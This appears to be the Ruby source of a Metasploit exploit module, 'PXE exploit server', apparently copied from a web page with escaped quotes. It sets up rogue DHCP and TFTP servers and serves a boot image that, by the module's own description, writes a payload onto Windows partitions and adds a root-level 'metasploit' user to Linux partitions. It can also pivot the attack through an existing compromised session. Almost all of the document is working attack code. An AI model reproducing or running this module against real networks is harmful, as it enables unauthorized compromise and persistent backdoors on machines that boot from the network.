# $Id: pxexploit.rb 13493 2011-08-05 17:10:27Z scriptjunkie $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
require &#039;rex/proto/tftp&#039;
require &#039;rex/proto/dhcp&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::TFTPServer
 
    def initialize
        super(
            &#039;Name&#039;        => &#039;PXE exploit server&#039;,
            &#039;Version&#039;     => &#039;$Revision: 13493 $&#039;,
            &#039;Description&#039;    => %q{
                This module provides a PXE server, running a DHCP and TFTP server.
                The default configuration loads a linux kernel and initrd into memory that
                reads the hard drive; placing the payload on the hard drive of any Windows
                partition seen, and add a uid 0 user with username and password metasploit to any
                linux partition seen.
            },
            &#039;Author&#039;      => [ &#039;scriptjunkie&#039; ],
            &#039;License&#039;     => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13493 $&#039;,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 4500,
                    &#039;DisableNops&#039; => &#039;True&#039;,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows Universal&#039;,
                        {
                        }
                    ],
                ],
            &#039;Privileged&#039;     => true,
            &#039;Stance&#039; => Msf::Exploit::Stance::Passive,
            &#039;DefaultTarget&#039;  => 0
        )
 
        register_options(
            [
                OptInt.new(&#039;SESSION&#039;,   [ false,  &#039;A session to pivot the attack through&#039; ])
            ], self.class)
 
        register_advanced_options(
            [
                OptString.new(&#039;TFTPROOT&#039;,   [ false,  &#039;The TFTP root directory to serve files from&#039; ]),
                OptString.new(&#039;SRVHOST&#039;,   [ false,  &#039;The IP of the DHCP server&#039; ]),
                OptString.new(&#039;NETMASK&#039;,   [ false,  &#039;The netmask of the local subnet&#039;, &#039;255.255.255.0&#039; ]),
                OptString.new(&#039;DHCPIPSTART&#039;,   [ false,  &#039;The first IP to give out&#039; ]),
                OptString.new(&#039;DHCPIPEND&#039;,   [ false,  &#039;The last IP to give out&#039; ])
            ], self.class)
    end
 
    def exploit
        if not datastore[&#039;TFTPROOT&#039;]
            datastore[&#039;TFTPROOT&#039;] = File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;pxexploit&#039;)
        end
        datastore[&#039;FILENAME&#039;] = "update1"
        datastore[&#039;SERVEONCE&#039;] = true # once they reboot; don&#039;t infect again - you&#039;ll kill them!
 
        # Prepare payload
        print_status("Creating initrd")
        initrd = IO.read(File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;pxexploit&#039;,&#039;updatecustom&#039;))
        payl = payload.generate
 
        if framework.sessions.include? datastore[&#039;SESSION&#039;]
            client = framework.sessions[datastore[&#039;SESSION&#039;]]
            if not client.lanattacks
                print_status("Loading lanattacks extension...")
                client.core.use("lanattacks")
            end
 
            print_status("Loading DHCP options...")
            client.lanattacks.load_dhcp_options(datastore)
            1.upto(4) do |i|
                print_status("Loading file #{i} of 4")
                if i < 4
                    contents = IO.read(::File.join(datastore[&#039;TFTPROOT&#039;],"update#{i}"))
                else
                    contents = initrd
                end
                client.lanattacks.add_tftp_file("update#{i}",contents)
            end
            print_status("Starting TFTP server...")
            client.lanattacks.start_tftp
            print_status("Starting DHCP server...")
            client.lanattacks.start_dhcp
            print_status("pxesploit attack started")
            return
        end
 
        # normal attack
        print_status("Starting TFTP server...")
        @tftp = Rex::Proto::TFTP::Server.new
        @tftp.set_tftproot(datastore[&#039;TFTPROOT&#039;])
        @tftp.register_file(&#039;update4&#039;,initrd)
        @tftp.start
 
        print_status("Starting DHCP server...")
        @dhcp = Rex::Proto::DHCP::Server.new( datastore )
        @dhcp.start
        print_status("pxesploit attack started")
 
        # Wait for finish..
        @tftp.thread.join
        @dhcp.thread.join
        print_status("pxesploit attack completed")
    end
 
end



